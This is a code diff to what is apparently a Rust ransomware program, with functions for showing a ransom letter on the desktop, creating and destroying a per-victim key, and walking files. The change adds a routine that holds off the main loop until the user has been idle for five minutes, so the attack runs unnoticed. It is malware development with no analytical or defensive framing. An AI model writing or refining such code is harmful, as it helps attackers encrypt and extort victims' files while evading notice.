@@ -13,7 +13,9 @@ use std::io::Write;
 use std::path::{Path, PathBuf};
 use std::sync::mpsc;
 use std::thread;
+use std::time::Duration;
 use sys_locale::get_locale;
+use user_idle::UserIdle;
 use walkdir::WalkDir;
 use widestring::U16CString;
 use windows::w;
@@ -238,6 +240,24 @@ fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
     Ok(())
 }
 
+fn wait_for_user_idle() {
+    loop {
+        if let Ok(idle) = UserIdle::get_time() {
+            if idle.as_seconds() >= 300 {
+                return;
+            }
+            log::debug!(
+                "User is idle for only {} milliseconds, waiting...",
+                idle.as_milliseconds()
+            );
+        } else {
+            // Can't get user idle time, just run immediately.
+            return;
+        }
+        thread::sleep(Duration::from_millis(500));
+    }
+}
+
 fn main() -> Result<()> {
     #[cfg(debug_assertions)]
     stderrlog::new()
@@ -252,9 +272,9 @@ fn main() -> Result<()> {
         return Ok(());
     }
     log::debug!("Single instance acquired");
-
     let victim_key = key_mgmt::ensure_key()?;
     log::debug!("Victim key acquired {:?}", &victim_key);
+    wait_for_user_idle();
     the_boring_loop(&victim_key)?;
     key_mgmt::destroy_key()?;
     log::debug!("Victim key removed from registry");
